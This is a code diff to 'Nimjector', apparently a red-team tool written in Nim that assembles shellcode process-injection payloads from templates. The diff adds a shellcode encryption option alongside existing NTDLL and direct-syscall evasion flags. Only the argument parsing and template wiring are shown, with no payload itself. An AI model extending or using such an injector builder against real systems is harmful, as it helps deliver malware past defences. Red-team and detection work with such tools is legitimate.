@@ -6,9 +6,7 @@ Nimjector v 1.0
 
 Usage:
   nimjector list -t <technique_name> [-c call]
-  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-n]
-  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-s] 
-  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-g] 
+  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-e] [-n | -s | -g]
   nimjector blue -f binary
   nimjector (-h | --help)
   nimjector --version
@@ -22,7 +20,7 @@ Options:
   -c --call  			Print specific API call (For list: use "all" to print all available calls)
   -P --print  			Print the template instead of writing into a file
   -p --process 			Target process to be spawned or injected
-  -e --encrypt 			Encrypts the shellcode 
+  -e --encrypt    		Encrypts the shellcode 
   -n --nt  			Use NTDLL calls instead of Kernel32
   -s --syscalls  		Use Syscalls via NimlineWhisphers2
   -g --gstub   			Use GetSyscallStub
@@ -62,8 +60,8 @@ if args["list"]:
 # For payload creation
 if args["red"]:
   let shellcode_file = $args["--image"]
+  let shellcode_type = $args["--encrypt"]
   let technique = $args["--technique"]
-  
 
   # For spawning remote processes
   var process = $args["--process"]
@@ -82,13 +80,14 @@ if args["red"]:
   if args["--gstub"]:
     variation = "gstub"
 
-  var modules = get_modules(technique, variation)
+  var modules = get_modules(technique, variation, shellcode_type)
   var setup = get_init_setup(technique, technique_list, variation)
+  var shellcode_template = get_shellcode_template(shellcode_type, encode(shellcode))
 
   var payload = build_template(technique, technique_list, variation)
   payload = payload.replace("REPLACE_MODULES", modules)
   payload = payload.replace("REPLACE_INIT_SETUP", setup)
-  payload = payload.replace("REPLACE_SHELLCODE", encode(shellcode))
+  payload = payload.replace("REPLACE_SC_TEMPLATE", shellcode_template)
   payload = payload.replace("REPLACE_PROCESS", process)
   
   if args["--print"]:
